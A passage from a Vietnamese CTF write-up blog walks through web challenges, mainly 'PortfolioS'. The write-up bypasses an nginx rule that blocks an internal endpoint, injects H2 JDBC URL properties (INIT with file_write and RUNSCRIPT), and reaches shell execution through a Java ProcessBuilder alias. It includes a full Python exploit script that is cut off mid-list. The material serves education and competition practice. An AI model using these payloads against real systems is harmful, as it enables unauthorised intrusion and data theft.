</span></span><span class="line"><span class="cl"><span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="n">url</span> <span class="o">+</span> <span class="sa">f</span><span class="s2">&#34;gateway/health/?module=@app2/storage/</span><span class="si">{</span><span class="n">user_id</span><span class="si">}</span><span class="s2">/shell.php&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Cuối cùng, sử dụng credential của user flag và đọc thông tin của user này, mail của tài khoản này sẽ chứa flag:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="n">url</span> <span class="o">+</span> <span class="s2">&#34;auth/token/&#34;</span><span class="p">,</span> <span class="n">json</span><span class="o">=</span><span class="p">{</span><span class="s2">&#34;username&#34;</span><span class="p">:</span> <span class="n">user</span><span class="p">,</span> <span class="s2">&#34;password&#34;</span><span class="p">:</span> <span class="n">password</span><span class="p">})</span>
</span></span><span class="line"><span class="cl"><span class="n">access_token</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">json</span><span class="p">()</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;access&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="n">url</span> <span class="o">+</span> <span class="s2">&#34;gateway/user/find/&#34;</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="p">{</span><span class="s2">&#34;Authorization&#34;</span><span class="p">:</span><span class="sa">f</span><span class="s2">&#34;Bearer </span><span class="si">{</span><span class="n">access_token</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">},</span> <span class="n">json</span><span class="o">=</span><span class="p">{</span><span class="s2">&#34;username&#34;</span><span class="p">:</span><span class="n">user</span><span class="p">})</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">)</span> 
</span></span><span class="line"><span class="cl"><span class="c1"># [{&#34;username&#34;:&#34;fla_user_nglong05_3&#34;,&#34;email&#34;:&#34;Q1NDVjIwMjV7WjFwX3oxUF8yMXBfQ2E3X2M0N19jQHRfX30K@nglong05.com&#34;}]</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="portfolios">PortfolioS</h2>
<p>Ứng dụng được cung cấp bao gồm 2 dịch vụ chính:</p>
<ul>
<li>
<p>app: một container chạy ứng dụng java spring boot</p>
</li>
<li>
<p>nginx: một container chạy nginx làm reverse proxy, mục đích là để chuyển tiếp các request đến app</p>
</li>
</ul>
<p><code>app</code> cung cấp các tính năng: đăng ký, đăng nhập, tạo và tải file markdown, đặc biệt có một endpoint nội bộ để kiểm tra kết nối đến database H2. Phân tích docker file, ta nhận thấy flag được đặt trong <code>/</code> với tên ngẫu nhiên, vậy mục tiêu của bài toán là RCE được dịch vụ. Bên cạnh đó, dịch vụ được cấu hình với network không gọi ra ngoài internet được, chỉ có thể đi qua nginx.</p>
<p><code>nginx</code> hoạt động như một reverse proxy, cấu hình ánh xạ port 8989 trên host tới port 80  trong container nginx, sau đó foward tới port 8989 của dịch vụ app (proxy_pass http://app:8989). Đặc biệt ở đây, nginx cấu hình chặn các request từ ngoài tới endpoint nội bộ:</p>
<pre tabindex="0"><code class="language-conf" data-lang="conf">http {
    server {
        listen 80;

        location = /internal/testConnection {
            return 403;
        }
</code></pre><p>Như vậy, luồng hoạt động của chương trình như sau: người dùng truy cập hệ thống qua <code>host:8989</code>, nginx nhận request trên port 80 sau đó forward đến <code>app:8989</code>. Tại đây app xử lý các request thông qua các endpoint: /login, /register, /dashboard được xử lý bởi các controller tương ứng (AuthController, DashboardController).</p>
<p>Ở đây ta chú ý: dữ liệu được lưu trong cơ sở dữ liệu H2 <code>jdbc:h2:mem:ctfdb</code>, còn
portfolio của người dùng được lưu dưới dạng tệp Markdown trong thư mục <code>/app/data/portfolios/&lt;username&gt;/portfolio_&lt;timestamp&gt;.md</code>.</p>
<p><strong>bypass nginx</strong></p>
<p>Kiểm tra image nginx được sử dụng, ta nhận thấy đây là một phiên bản khá cũ (nginx:1.20.2), thực hiện tìm kiếm exploit đưa ta đến một bài viết:</p>
<p><a href="https://blog.1nf1n1ty.team/hacktricks/pentesting-web/proxy-waf-protections-bypass">Proxy / WAF Protections Bypass | Hacktricks</a></p>
<p>
  
  
<figure class="image-container">
  <a href="/2026/01/writeup-web-cybersecurity-student-contest-vietnam-2025/csvswu_image1.png" 
     class="lightbox-trigger" 
     >
      <img src="/2026/01/writeup-web-cybersecurity-student-contest-vietnam-2025/csvswu_image1_hu_a9af1ece63f46a79.webp" 
           
             width="815" height="306"
           
           alt="" 
           class="main-content__article-body-img" 
           loading="lazy" 
      />
  </a>
  
  
</figure></p>
<p>Ở đây, ta sẽ không đi quá sâu lý do vì sao có thể bypass như vậy, về cơ bản đến từ việc nginx ép rule lên path nhất định nhưng tomcat lại có cơ chế parse lại url. Vậy, ta có thể thực hiện kiểm tra cách bypass như sau:</p>
<p>
  
  
<figure class="image-container">
  <a href="/2026/01/writeup-web-cybersecurity-student-contest-vietnam-2025/csvswu_image2.png" 
     class="lightbox-trigger" 
     >
      <img src="/2026/01/writeup-web-cybersecurity-student-contest-vietnam-2025/csvswu_image2_hu_abde96b571387b8e.webp" 
           
             width="1609" height="739"
           
           alt="" 
           class="main-content__article-body-img" 
           loading="lazy" 
      />
  </a>
  
  
</figure></p>
<p><strong>lợi dụng chức năng kiểm tra H2 database</strong></p>
<p>Sau khi đã thành công bypass, ta thực hiện phân tích controller tương ứng của nó.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">public</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="nf">testConnection</span><span class="p">(</span><span class="nd">@RequestParam</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">username</span><span class="p">,</span><span class="w"> </span><span class="nd">@RequestParam</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">password</span><span class="p">,</span><span class="w"> </span><span class="n">Model</span><span class="w"> </span><span class="n">model</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">((</span><span class="n">username</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">password</span><span class="p">).</span><span class="na">length</span><span class="p">()</span><span class="w"> </span><span class="o">&gt;=</span><span class="w"> </span><span class="n">95</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">model</span><span class="p">.</span><span class="na">addAttribute</span><span class="p">(</span><span class="s">&#34;error&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;Username + password to long.&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="s">&#34;internal&#34;</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">String</span><span class="w"> </span><span class="n">baseUrl</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&#34;jdbc:h2:mem:test;&#34;</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">String</span><span class="w"> </span><span class="n">fullUrl</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">baseUrl</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s">&#34;USER=&#34;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">username</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s">&#34;;PASSWORD=&#34;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">password</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s">&#34;;&#34;</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">try</span><span class="w"> </span><span class="p">(</span><span class="n">Connection</span><span class="w"> </span><span class="n">conn</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">DriverManager</span><span class="p">.</span><span class="na">getConnection</span><span class="p">(</span><span class="n">fullUrl</span><span class="p">))</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">model</span><span class="p">.</span><span class="na">addAttribute</span><span class="p">(</span><span class="s">&#34;message&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;Connected successfully to: &#34;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">fullUrl</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">return</span><span class="w"> </span><span class="s">&#34;internal&#34;</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="n">Exception</span><span class="w"> </span><span class="n">e</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">String</span><span class="w"> </span><span class="n">var10002</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">e</span><span class="p">.</span><span class="na">getMessage</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">model</span><span class="p">.</span><span class="na">addAttribute</span><span class="p">(</span><span class="s">&#34;error&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;Connection failed: &#34;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">var10002</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s">&#34; | URL: &#34;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">fullUrl</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">return</span><span class="w"> </span><span class="s">&#34;internal&#34;</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="p">}</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>Tại đây, chương trình nhận vào các tham số gồm username và password.</p>
<ul>
<li>
<p>Đầu tiên kiểm tra tổng ký tự, nếu vượt quá 95 thì trả về lỗi.</p>
</li>
<li>
<p>Sau đó chương trình kết nối đến H2 database sử dụng format string, ở đây ta nhận thấy không có biện pháp sanitize nào ngoại trừ kiểm tra độ dài chuỗi, ta có thể inject các H2 URL properties nhờ stack query (ví dụ ;INIT=&hellip;).</p>
</li>
<li>
<p>Đồng thời chương trình cũng trả về lỗi <code>e.getMessage()</code> trực tiếp tại response.</p>
</li>
</ul>
<p>Đến đây ta có hai hướng: ghi và thực thi một file sql từ đó RCE, hoặc là dựa vào error để leak flag. Với yêu cầu bài toán là thực hiện RCE dịch vụ, ta tiếp tục đi theo hướng thứ nhất đã đề ra.</p>
<p><strong>thực hiện ghi và thực thi sql file</strong></p>
<p>Để ghi dữ liệu vào hệ thống của đề bài, ta thực hiện tìm kiếm các hàm có thể ghi/tạo file: <a href="https://www.h2database.com/html/functions.html">https://www.h2database.com/html/functions.html</a></p>
<p>Ta sẽ sử dụng hàm <code>file_write</code>, để thực thi hàm ta sử dụng <a href="https://www.h2database.com/html/features.html?highlight=init&amp;search=init#execute_sql_on_connection">INIT</a>: là một initialization parameter để thực thi SQL ngay khi kết nối tới database. Bên cạnh đó, ta chèn thêm <code>;</code> để ngắt query của chương trình, ví dụ như sau:</p>
<pre tabindex="0"><code>username=x&amp;password=x;INIT=call file_write(&#39;pwned&#39;,&#39;./call.txt&#39;)
</code></pre><p>Ta thực hiện viết script để thử nghiệm, có thể thấy trong hệ thống đã tồn tại một file mới:</p>
<p>
  
  
<figure class="image-container">
  <a href="/2026/01/writeup-web-cybersecurity-student-contest-vietnam-2025/csvswu_image3.png" 
     class="lightbox-trigger" 
     >
      <img src="/2026/01/writeup-web-cybersecurity-student-contest-vietnam-2025/csvswu_image3_hu_79c43c741c905908.webp" 
           
             width="921" height="827"
           
           alt="" 
           class="main-content__article-body-img" 
           loading="lazy" 
      />
  </a>
  
  
</figure></p>
<p>Vấn đề tiếp theo là thực hiện chèn nội dung file SQL tùy ý trong hệ thống, sau đó sử dụng <code>runscript</code> để thực thi: <a href="https://stackoverflow.com/questions/10675768/executing-script-file-in-h2-database">Executing script file in h2 database - Stack Overflow</a></p>
<p>Để ghi file lên hệ thống, ta tiếp tục sử dụng hàm <code>file_write</code>, tuy nhiên payload sẽ vượt quá 95 ký tự nếu ta trực tiếp sử dụng nó để ghi toàn bộ nội dung file SQL. Vậy ta có ý tưởng tiếp theo: append từng ký tự vào file ta đã thực hiện tạo từ trước.</p>
<p>Quay lại kiểm tra docs của H2, ta nhận thấy không có hàm nào có thể append ký tự vào, vậy ta sẽ sử dụng thêm hàm <code>file_read</code>, docs: <a href="https://www.h2database.com/html/functions.html#file_read">https://www.h2database.com/html/functions.html#file_read</a> . Ở đây ta lưu ý thêm param thứ 2 cho file_read để chỉ rõ character set sử dụng như đã đề cập trong doc. Mục đích là ta sẽ append nội dung mà file_read đọc được, sau đó append thêm ký tự bằng <code>||</code>:</p>
<pre tabindex="0"><code>call file_write(file_read(&#39;./call.txt&#39;, &#39;UTF-8&#39;)||&#39;x&#39;, &#39;./call.txt&#39;) 
</code></pre><p>Đến đây, ta sẽ thực hiện thêm từng ký tự trong payload của chúng ta vào <code>./call.txt</code>, script được viết tiếp như sau:</p>
<p>
  
  
<figure class="image-container">
  <a href="/2026/01/writeup-web-cybersecurity-student-contest-vietnam-2025/csvswu_image4.png" 
     class="lightbox-trigger" 
     >
      <img src="/2026/01/writeup-web-cybersecurity-student-contest-vietnam-2025/csvswu_image4_hu_6556604baa5e672d.webp" 
           
             width="1633" height="598"
           
           alt="" 
           class="main-content__article-body-img" 
           loading="lazy" 
      />
  </a>
  
  
</figure></p>
<p>Sau khi đã thành công RCE, ta kiếm cách để lấy flag. Vì docker được cấu hình với network không thể kết nối ra ngoài internet, ta sẽ đưa output của command ra dịch vụ để có thể truy cập.</p>
<p><strong>final payload</strong></p>
<p>Chương trình cho phép người dùng upload một file markdown lên hệ thống, tuy nhiên các file được upload sẽ bị append thêm những chuỗi nhất định ở đầu file, ta có thể thấy rõ logic này trong controller tương ứng nên không thể nhét SQL vào đây mà phải thực hiện RCE như trên đã trình bày.</p>
<p>File markdown của người dùng được lưu tại <code>/app/data/portfolios/user-name/portfolio_timestamp.md</code> và có thể truy cập ở dịch vụ thông qua <code>GET /download/portfolio_timestamp.md</code>. Ta thực hiện đưa output của command RCE đến path này và truy cập:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">CREATE</span><span class="w"> </span><span class="k">ALIAS</span><span class="w"> </span><span class="k">EXEC</span><span class="w"> </span><span class="k">AS</span><span class="w"> </span><span class="err">$$</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="n">void</span><span class="w"> </span><span class="k">exec</span><span class="p">()</span><span class="w"> </span><span class="n">throws</span><span class="w"> </span><span class="n">java</span><span class="p">.</span><span class="n">io</span><span class="p">.</span><span class="n">IOException</span><span class="w"> </span><span class="err">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">new</span><span class="w"> </span><span class="n">java</span><span class="p">.</span><span class="n">lang</span><span class="p">.</span><span class="n">ProcessBuilder</span><span class="p">(</span><span class="s2">&#34;/bin/sh&#34;</span><span class="p">,</span><span class="s2">&#34;-c&#34;</span><span class="p">,</span><span class="s2">&#34;cat /* &gt; /app/data/portfolios/nglong05/rce.txt&#34;</span><span class="p">)</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">.</span><span class="k">start</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="err">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="err">$$</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="k">CALL</span><span class="w"> </span><span class="k">EXEC</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="err">$$</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>Sau đó ta xác nhận payload đã hoạt động đúng:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">curl http://localhost:8989/download/flag.txt -H <span class="s2">&#34;Cookie: JSESSIONID=A27A07E4F8C5A27EB7FF7AF741D07889&#34;</span>
</span></span><span class="line"><span class="cl">CSCV<span class="o">{</span>Fake_flag<span class="o">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Trong quá trình thi, đã có đội sử dụng payload <code>;DB_CLOSE_DELAY=-1</code> khiến H2 vào trạng thái in-memory DB cho nên H2 sẽ luôn bind với credentials đầu tiên mà nó nhận được, tức chỉ có đội sử dụng payload này mới có thể sử dụng H2. Đó là lý do bài này giữ 1 solve khá lâu cho đến khi ban tổ chức chạy lại chương trình.</p>
<p>Full payload:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">time</span>
</span></span><span class="line"><span class="cl"><span class="n">host</span> <span class="o">=</span> <span class="s2">&#34;localhost&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">url</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&#34;http://</span><span class="si">{</span><span class="n">host</span><span class="si">}</span><span class="s2">:8989/&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">s</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">Session</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">cre</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&#34;username&#34;</span><span class="p">:</span> <span class="s2">&#34;nglong05&#34;</span><span class="p">,</span> <span class="s2">&#34;password&#34;</span><span class="p">:</span> <span class="s2">&#34;ass&#34;</span><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="n">r</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span> <span class="o">+</span> <span class="s2">&#34;register&#34;</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">cre</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">r</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span> <span class="o">+</span> <span class="s2">&#34;login&#34;</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">cre</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">session</span> <span class="o">=</span> <span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">cookies</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&#34;JSESSIONID&#34;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">r</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span> <span class="o">+</span> <span class="s2">&#34;dashboard/save&#34;</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="p">{</span><span class="s2">&#34;content&#34;</span><span class="p">:</span><span class="s2">&#34;nothing&#34;</span><span class="p">})</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">socket</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">send</span><span class="p">(</span><span class="n">username</span><span class="p">,</span> <span class="n">password</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span> <span class="o">=</span> <span class="p">(</span>
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;POST /internal/testConnection</span><span class="se">\t</span><span class="s2"> HTTP/1.1</span><span class="se">\r\n</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="sa">f</span><span class="s2">&#34;Host: </span><span class="si">{</span><span class="n">host</span><span class="si">}</span><span class="se">\r\n</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;Content-Type: application/x-www-form-urlencoded</span><span class="se">\r\n</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="sa">f</span><span class="s2">&#34;Content-Length: </span><span class="si">{</span><span class="mi">19</span> <span class="o">+</span> <span class="nb">len</span><span class="p">(</span><span class="n">username</span><span class="p">)</span> <span class="o">+</span> <span class="nb">len</span><span class="p">(</span><span class="n">password</span><span class="p">)</span><span class="si">}</span><span class="se">\r\n</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="sa">f</span><span class="s2">&#34;Cookie: JSESSIONID=</span><span class="si">{</span><span class="n">session</span><span class="si">}</span><span class="se">\r\n</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;</span><span class="se">\r\n</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="sa">f</span><span class="s2">&#34;username=</span><span class="si">{</span><span class="n">username</span><span class="si">}</span><span class="s2">&amp;password=</span><span class="si">{</span><span class="n">password</span><span class="si">}</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">with</span> <span class="n">socket</span><span class="o">.</span><span class="n">create_connection</span><span class="p">((</span><span class="n">host</span><span class="p">,</span> <span class="mi">8989</span><span class="p">))</span> <span class="k">as</span> <span class="n">s</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">s</span><span class="o">.</span><span class="n">sendall</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
</span></span><span class="line"><span class="cl">        <span class="n">html</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">4069</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="n">html</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">send</span><span class="p">(</span><span class="s2">&#34;sa&#34;</span><span class="p">,</span><span class="s2">&#34;;DB_CLOSE_DELAY=1&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">send</span><span class="p">(</span><span class="s2">&#34;sa&#34;</span><span class="p">,</span><span class="s2">&#34;;INIT=call file_write(&#39;&#39;,&#39;call.txt&#39;)&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nb">list</span> <span class="o">=</span> <span class="p">[</span><span class="s1">&#39;C&#39;</span><span class="p">,</span><span class="s1">&#39;R&#39;</span><span class="p">,</span><span class="s1">&#39;E&#39;</span><span class="p">,</span><span class="s1">&#39;A&#39;</span><span class="p">,</span><span class="s1">&#39;T&#39;</span><span class="p">,</span><span class="s1">&#39;E&#39;</span><span class="p">,</span><span class="s1">&#39; &#39;</span><span class="p">,</span><span class="s1">&#39;A&#39;</span><span class="p">,</span><span class="s1">&#39;L&#39;</span><span class="p">,</span><span class="s1">&#39;I&#39;</span><span class="p">,</span><span class="s1">&#39;A&#39;</span><span class="p">,</span><span class="s1">&#39;S&#39;</span><span class="p">,</span><span class="s1">&#39; &#39;</span><span class="p">,</span><span class="s1">&#39;E&#39;</span><span class="p">,</span><span class="s1">&#39;X&#39;</span><span class="p">,</span><span class="s1">&#39;E&#39;</span><span class="p">,</span><span class="s1">&#39;C&#39;</span><span class="p">,</span><span class="s1">&#39; &#39;</span><span class="p">,</span><span class="s1">&#39;A&#39;</span><span class="p">,</span><span class="s1">&#39;S&#39;</span><span class="p">,</span><span class="s1">&#39; &#39;</span><span class="p">,</span><span class="s1">&#39;$&#39;</span><span class="p">,</span><span class="s1">&#39;$&#39;</span><span class="p">,</span><span class="s1">&#39;v&#39;</span><span class="p">,</span><span class="s1">&#39;o&#39;</span><span class="p">,</span><span class="s1">&#39;i&#39;</span><span class="p">,</span><span class="s1">&#39;d&#39;</span><span class="p">,</span><span class="s1">&#39; &#39;</span><span class="p">,</span><span class="s1">&#39;e&#39;</span><span class="p">,</span><span class="s1">&#39;x&#39;</span><span class="p">,</span><span class="s1">&#39;e&#39;</span><span class="p">,</span><span class="s1">&#39;c&#39;</span><span class="p">,</span><span class="s1">&#39;(&#39;</span><span class="p">,</span><span class="s1">&#39;)&#39;</span><span class="p">,</span><span class="s1">&#39; &#39;</span><span class="p">,</span><span class="s1">&#39;t&#39;</span><span class="p">,</span><span class="s1">&#39;h&#39;</span><span class="p">,</span><span class="s1">&#39;r&#39;</span><span class="p">,</span><span class="s1">&#39;o&#39;</span><span class="p">,</span><span class="s1">&#39;w&#39;</span><span class="p">,</span><span class="s1">&#39;s&#39;</span><span class="p">,</span><span class="s1">&#39; &#39;</span><span class="p">,</span><span class="s1">&#39;j&#39;</span><span class="p">,</span><span class="s1">&#39;a&#39;</span><span class="p">,</span><span class="s1">&#39;v&#39;</span><span class="p">,</span><span class="s1">&#39;a&#39;</span><span class="p">,</span><span class="s1">&#39;.&#39;</span><span class="p">,</span><span class="s1">&#39;i&#39;</span><span class="p">,</span><span class="s1">&#39;o&#39;</span><span class="p">,</span><span class="s1">&#39;.&#39;</span><span class="p">,</span><span class="s1">&#39;I&#39;</span><span class="p">,</span><span class="s1">&#39;O&#39;</span><span class="p">,</span><span class="s1">&#39;E&#39;</span><span class="p">,</span><span class="s1">&#39;x&#39;</span><span class="p">,</span><span class="s1">&#39;c&#39;</span><span class="p">,</span><span class="s1">&#39;e&#39;</span><span class="p">,</span><span class="s1">&#39;p&#39;</span><span class="p">,</span><span class="s1">&#39;t&#39;</span><span class="p">,</span><span class="s1">&#39;i&#39;</span><span class="p">,</span><span class="s1">&#39;o&#39;</span><span class="p">,</span><span class="s1">&#39;n&#39;</span><span class="p">,</span><span class="s1">&#39; &#39;</span><span class="p">,</span><span class="s1">&#39;{&#39;</span><span class="p">,</span><span class="s1">&#39;n&#39;</span><span class="p">,</span><span class="s1">&#39;e&#39;</span><span class="p">,</span><span class="s1">&#39;w&#39;</span><span class="p">,</span><span class="s1">&#39; &#39;</span><span 